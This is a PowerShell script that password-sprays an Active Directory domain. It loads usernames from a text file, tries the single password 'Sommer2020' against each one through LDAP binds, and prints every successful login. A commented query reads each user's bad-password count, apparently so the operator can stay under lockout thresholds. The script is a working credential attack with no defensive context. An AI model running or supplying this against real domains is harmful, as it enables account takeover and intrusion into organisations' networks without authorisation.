$userlist = Get-content "C:\users\bob\desktop\userlist.txt"
$password = "Sommer2020"
$Domain ="domain.local"
$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
$count = $UserList.count
Write-Host "[*] Now trying password $password against $count users."
foreach($user in $userlist){
    $checkdomain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$password)
    if ($checkdomain.name -ne $null)
    {
        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
    }
}

# Check bad password attempt count:
# ([adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User))").FindAll() | % {write-host $_.Properties['name'] "--->" $_.Properties['badpwdcount'] }
